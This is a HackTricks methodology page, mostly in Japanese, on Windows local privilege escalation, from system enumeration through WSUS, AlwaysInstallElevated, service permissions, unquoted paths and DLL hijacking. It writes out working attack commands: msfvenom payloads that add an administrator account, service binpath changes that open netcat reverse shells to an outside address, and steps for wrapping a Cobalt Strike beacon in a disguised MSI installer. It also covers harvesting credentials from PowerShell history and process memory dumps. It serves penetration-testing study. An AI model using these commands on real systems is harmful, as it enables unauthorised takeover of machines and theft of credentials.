# Windows Local Privilege Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**Windowsのアクセス トークンとは何か知らない場合は、続行する前に次のページをお読みください:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs についての詳細は、次のページを確認してください:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Integrity Levels

**Windowsの整合性レベルとは何か知らない場合は、続行する前に次のページをお読みください:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows Security Controls

Windows には、**システムの列挙を妨げる**、実行可能ファイルを実行する、または**あなたの活動を検出する**可能性のあるさまざまな要素があります。特権昇格の列挙を開始する前に、次の**ページ**を**読み**、これらの**防御****メカニズム**をすべて**列挙**する必要があります:

{% content-ref url="../authentication-credentials-uac-and-efs/" %}
[authentication-credentials-uac-and-efs](../authentication-credentials-uac-and-efs/)
{% endcontent-ref %}

## System Info

### Version info enumeration

Windows バージョンに既知の脆弱性があるかどうかを確認してください (適用されたパッチも確認してください)。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoftのセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700以上のセキュリティ脆弱性があり、Windows環境が提供する**大規模な攻撃面**を示しています。

**システム上で**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeasにはwatsonが組み込まれています)_

**システム情報を使用してローカルに**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**エクスプロイトのGithubリポジトリ:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に保存された資格情報/重要な情報はありますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShellの履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell トランスクリプトファイル

これをオンにする方法は、[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)で学ぶことができます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell モジュール ロギング

PowerShell パイプラインの実行の詳細が記録され、実行されたコマンド、コマンドの呼び出し、およびスクリプトの一部が含まれます。ただし、完全な実行の詳細と出力結果はキャプチャされない場合があります。

これを有効にするには、ドキュメントの「トランスクリプトファイル」セクションの指示に従い、**「モジュール ロギング」**を選択してください。**「Powershell トランスクリプション」**の代わりに。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Powershellログから最後の15イベントを表示するには、次のコマンドを実行できます:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **スクリプトブロックロギング**

スクリプトの実行の完全な活動と全内容の記録がキャプチャされ、実行されるコードの各ブロックが文書化されることを保証します。このプロセスは、各活動の包括的な監査証跡を保持し、フォレンジックや悪意のある行動の分析にとって貴重です。実行時にすべての活動を文書化することにより、プロセスに関する詳細な洞察が提供されます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
スクリプトブロックのログイベントは、Windowsイベントビューアのパスにあります: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
最後の20件のイベントを表示するには、次のコマンドを使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

システムは、更新がhttpではなくhttp**S**を使用してリクエストされていない場合に危険にさらされます。

次に、以下を実行してネットワークが非SSL WSUS更新を使用しているかどうかを確認します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
もし次のような返信があった場合：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` が `1` に等しい場合。

その場合、**悪用可能です。** 最後のレジストリが 0 に等しい場合、WSUS エントリは無視されます。

この脆弱性を悪用するには、次のようなツールを使用できます: [Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) - これらは、非 SSL WSUS トラフィックに「偽」の更新を注入するための MiTM 武器化されたエクスプロイトスクリプトです。

研究をこちらでお読みください:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**完全なレポートをこちらでお読みください**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。\
基本的に、これはこのバグが悪用する欠陥です：

> ローカルユーザープロキシを変更する権限があり、Windows Update が Internet Explorer の設定で構成されたプロキシを使用する場合、私たちは [PyWSUS](https://github.com/GoSecure/pywsus) をローカルで実行して自分のトラフィックを傍受し、資産上で昇格されたユーザーとしてコードを実行する権限を持っています。
>
> さらに、WSUS サービスは現在のユーザーの設定を使用するため、その証明書ストアも使用します。WSUS ホスト名の自己署名証明書を生成し、この証明書を現在のユーザーの証明書ストアに追加すれば、HTTP および HTTPS WSUS トラフィックの両方を傍受できるようになります。WSUS は、証明書に対して信頼性のある初回使用型の検証を実装するための HSTS のようなメカニズムを使用していません。提示された証明書がユーザーによって信頼され、正しいホスト名を持っている場合、サービスによって受け入れられます。

この脆弱性を利用するには、ツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) を使用できます（解放された場合）。

## KrbRelayUp

**ローカル特権昇格**の脆弱性は、特定の条件下で Windows **ドメイン** 環境に存在します。これらの条件には、**LDAP 署名が強制されていない**環境、ユーザーが **リソースベースの制約付き委任 (RBCD)** を構成する権利を持っている環境、およびユーザーがドメイン内でコンピュータを作成する能力が含まれます。これらの**要件**は、**デフォルト設定**を使用して満たされることに注意が必要です。

**エクスプロイトを見つけるには** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

攻撃の流れについての詳細は、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) を確認してください。

## AlwaysInstallElevated

**これらの 2 つのレジスタが** **有効** (値が **0x1**) の場合、あらゆる特権のユーザーが NT AUTHORITY\\**SYSTEM** として `*.msi` ファイルを **インストール** (実行) できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit ペイロード
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
もしあなたがmeterpreterセッションを持っているなら、モジュール**`exploit/windows/local/always_install_elevated`**を使用してこの技術を自動化できます。

### PowerUP

`Write-UserAddMSI`コマンドをpower-upから使用して、現在のディレクトリ内に特権を昇格させるためのWindows MSIバイナリを作成します。このスクリプトは、ユーザー/グループの追加を促す事前コンパイルされたMSIインストーラーを書き出します（そのため、GIUアクセスが必要です）：
```
Write-UserAddMSI
```
Just execute the created binary to escalate privileges.

### MSI Wrapper

このチュートリアルを読んで、このツールを使用してMSIラッパーを作成する方法を学びます。**コマンドラインを実行**したいだけの場合は、"**.bat**"ファイルをラップすることができます。

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Create MSI with WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Create MSI with Visual Studio

* **Cobalt Strike**または**Metasploit**を使用して、`C:\privesc\beacon.exe`に**新しいWindows EXE TCPペイロード**を生成します。
* **Visual Studio**を開き、**新しいプロジェクトを作成**を選択し、検索ボックスに「installer」と入力します。**Setup Wizard**プロジェクトを選択し、**Next**をクリックします。
* プロジェクトに**AlwaysPrivesc**のような名前を付け、場所に**`C:\privesc`**を使用し、**ソリューションとプロジェクトを同じディレクトリに配置**を選択し、**Create**をクリックします。
* **Next**をクリックし続け、ステップ3の4（含めるファイルを選択）に到達します。**Add**をクリックし、先ほど生成したBeaconペイロードを選択します。次に、**Finish**をクリックします。
* **Solution Explorer**で**AlwaysPrivesc**プロジェクトをハイライトし、**Properties**で**TargetPlatform**を**x86**から**x64**に変更します。
* **Author**や**Manufacturer**など、インストールされたアプリをより正当なものに見せるために変更できる他のプロパティもあります。
* プロジェクトを右クリックし、**View > Custom Actions**を選択します。
* **Install**を右クリックし、**Add Custom Action**を選択します。
* **Application Folder**をダブルクリックし、**beacon.exe**ファイルを選択して**OK**をクリックします。これにより、インストーラーが実行されるとすぐにビークンペイロードが実行されることが保証されます。
* **Custom Action Properties**の下で、**Run64Bit**を**True**に変更します。
* 最後に、**ビルド**します。
* 警告`File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`が表示された場合は、プラットフォームをx64に設定していることを確認してください。

### MSI Installation

悪意のある`.msi`ファイルの**インストール**を**バックグラウンド**で実行するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always\_install\_elevated_

## アンチウイルスと検出器

### 監査設定

これらの設定は何が**ログ**されるかを決定するため、注意を払うべきです。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwardingは、ログがどこに送信されるかを知ることが興味深いです。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**は、**ローカル管理者パスワードの管理**のために設計されており、ドメインに参加しているコンピュータ上で各パスワードが**一意で、ランダム化され、定期的に更新される**ことを保証します。これらのパスワードはActive Directory内に安全に保存され、ACLを通じて十分な権限が付与されたユーザーのみがアクセスでき、認可されている場合にローカル管理者パスワードを表示できます。

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

アクティブな場合、**平文のパスワードはLSASS**（ローカルセキュリティ権限サブシステムサービス）に保存されます。\
[**WDigestに関する詳細はこのページを参照してください**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA保護

**Windows 8.1**以降、Microsoftはローカルセキュリティ機関（LSA）の強化された保護を導入し、信頼されていないプロセスによる**メモリの読み取り**やコードの注入を**ブロック**することで、システムのセキュリティをさらに強化しました。\
[**LSA保護の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、デバイスに保存された資格情報をパス・ザ・ハッシュ攻撃のような脅威から保護することです。| [**Credentials Guard に関する詳細はこちら。**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### キャッシュされた資格情報

**ドメイン資格情報**は、**ローカルセキュリティ機関**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録されたセキュリティパッケージによって認証されると、通常、ユーザーのドメイン資格情報が確立されます。\
[**キャッシュされた資格情報の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

自分が所属するグループに興味深い権限があるかどうかを確認する必要があります。
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

もしあなたが**特権グループに属している場合、特権を昇格させることができるかもしれません**。特権グループについて学び、特権を昇格させるためにそれらを悪用する方法についてはこちらをご覧ください：

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### トークン操作

このページで**トークン**とは何かについて**もっと学びましょう**：[**Windows Tokens**](../authentication-credentials-uac-and-efs/#access-tokens)。\
次のページをチェックして**興味深いトークンについて学び**、それらを悪用する方法を確認してください：

{% content-ref url="privilege-escalation-abusing-tokens.md" %}
[privilege-escalation-abusing-tokens.md](privilege-escalation-abusing-tokens.md)
{% endcontent-ref %}

### ログインユーザー / セッション
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダーの権限

まず、プロセスをリストアップして**プロセスのコマンドライン内にパスワードがないか確認**します。\
**実行中のバイナリを上書きできるか**、またはバイナリフォルダーの書き込み権限があるかを確認して、可能な[**DLLハイジャック攻撃**](dll-hijacking/)を利用します：
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に実行中の可能性のある [**electron/cef/chromiumデバッガー** を確認してください。これを悪用して特権を昇格させることができます](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)。

**プロセスバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスバイナリのフォルダの権限を確認する (**[**DLL Hijacking**](dll-hijacking/)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### メモリパスワードマイニング

**procdump**を使用して、実行中のプロセスのメモリダンプを作成できます。FTPのようなサービスは**メモリ内に平文の資格情報を持っています**ので、メモリをダンプして資格情報を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全なGUIアプリ

**SYSTEMとして実行されているアプリケーションは、ユーザーがCMDを起動したり、ディレクトリをブラウズしたりすることを許可する場合があります。**

例: "Windowsヘルプとサポート" (Windows + F1)、"コマンドプロンプト"を検索し、"コマンドプロンプトを開くをクリック"をクリック

## サービス

サービスのリストを取得:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### パーミッション

**sc**を使用してサービスの情報を取得できます。
```bash
sc qc <service_name>
```
**accesschk** バイナリを _Sysinternals_ から取得し、各サービスの必要な特権レベルを確認することをお勧めします。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users"がサービスを変更できるかどうかを確認することをお勧めします:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[こちらからXP用のaccesschk.exeをダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

このエラーが発生している場合（例えばSSDPSRVの場合）：

_システムエラー1058が発生しました。_\
&#xNAN;_&#x54;サービスは無効になっているか、関連付けられた有効なデバイスがないため、開始できません。_

次のようにして有効にできます。
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**この問題の別の回避策**は、次のコマンドを実行することです：
```
sc.exe config usosvc start= auto
```
### **サービスバイナリパスの変更**

「認証されたユーザー」グループがサービスに対して**SERVICE\_ALL\_ACCESS**を持つシナリオでは、サービスの実行可能バイナリを変更することが可能です。**sc**を変更して実行するには:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
特権はさまざまな権限を通じて昇格できます：

* **SERVICE\_CHANGE\_CONFIG**: サービスバイナリの再構成を許可します。
* **WRITE\_DAC**: 権限の再構成を可能にし、サービス設定の変更ができるようになります。
* **WRITE\_OWNER**: 所有権の取得と権限の再構成を許可します。
* **GENERIC\_WRITE**: サービス設定を変更する能力を継承します。
* **GENERIC\_ALL**: サービス設定を変更する能力も継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service\_permissions_ を利用できます。

### サービスバイナリの弱い権限

**サービスによって実行されるバイナリを変更できるかどうか**、または**バイナリがあるフォルダーに対する書き込み権限があるかどうかを確認してください**（[**DLL Hijacking**](dll-hijacking/)）**。**\
**wmic**（system32ではない）を使用してサービスによって実行されるすべてのバイナリを取得し、**icacls**を使用して権限を確認できます：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
**sc** と **icacls** も使用できます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### サービスレジストリの変更権限

サービスレジストリを変更できるか確認する必要があります。\
サービスレジストリに対する権限を**確認**するには、次のようにします:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているかどうかを確認する必要があります。もしそうであれば、サービスによって実行されるバイナリを変更することができます。

実行されるバイナリのパスを変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### サービスレジストリ AppendData/AddSubdirectory 権限

この権限を持っている場合、**このレジストリからサブレジストリを作成できる**ことを意味します。Windows サービスの場合、これは**任意のコードを実行するのに十分です：**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### 引用されていないサービスパス

実行可能ファイルへのパスが引用符で囲まれていない場合、Windows はスペースの前にあるすべての部分を実行しようとします。

例えば、パス _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次のように実行しようとします：
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
すべての引用されていないサービスパスをリストし、組み込みのWindowsサービスに属するものは除外します:
```powershell
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```powershell
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```powershell
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性を検出し、悪用することができます** metasploitを使用して: `exploit/windows/local/trusted\_service\_path` metasploitを使用してサービスバイナリを手動で作成できます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windowsは、サービスが失敗した場合に実行されるアクションを指定することをユーザーに許可します。この機能は、バイナリを指すように構成できます。このバイナリが置き換え可能であれば、特権昇格が可能かもしれません。詳細は[公式ドキュメント](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN)で確認できます。

## Applications

### Installed Applications

**バイナリの権限**（上書きして特権を昇格できるかもしれません）と**フォルダー**の権限を確認してください（[DLL Hijacking](dll-hijacking/)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

特定のファイルを読み取るために設定ファイルを変更できるか、または管理者アカウントによって実行されるバイナリ（schedtasks）を変更できるかを確認します。

システム内の弱いフォルダー/ファイルの権限を見つける方法は次のとおりです：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### スタートアップ時に実行

**異なるユーザーによって実行されるレジストリまたはバイナリを上書きできるか確認してください。**\
**以下のページを読んで、特権を昇格させるための興味深い** **autorunsの場所** **について学んでください**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### ドライバー

可能な**サードパーティの奇妙/脆弱な**ドライバーを探してください。
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

もし**PATH内のフォルダーに書き込み権限がある場合**、プロセスによって読み込まれるDLLをハイジャックし、**権限を昇格させる**ことができるかもしれません。

PATH内のすべてのフォルダーの権限を確認してください:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細については、次を参照してください：

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hostsファイルにハードコーディングされた他の既知のコンピュータを確認します。
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェースとDNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

外部からの**制限されたサービス**を確認します
```bash
netstat -ano #Opened ports?
```
